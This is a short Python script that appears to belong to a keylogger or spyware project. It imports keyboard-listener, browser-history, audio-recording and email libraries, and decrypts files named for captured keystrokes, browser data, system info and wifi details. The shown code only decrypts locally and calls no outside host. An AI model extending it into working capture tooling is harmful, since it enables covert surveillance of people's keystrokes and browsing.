import subprocess, socket, os, re, smtplib, \
        logging, pathlib, json, time, shutil
import requests
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email import encoders

def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()

files = [ 'system_info.txt', 
            'browser.txt', 'key_logs.txt', 'network_wifi.txt' ]

key = load_key()

for file in files:
    f = Fernet(key)
    with open(file, "rb") as file1:
        # read the encrypted data
        encrypted_data = file1.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(file, "wb") as file2:
        file2.write(decrypted_data)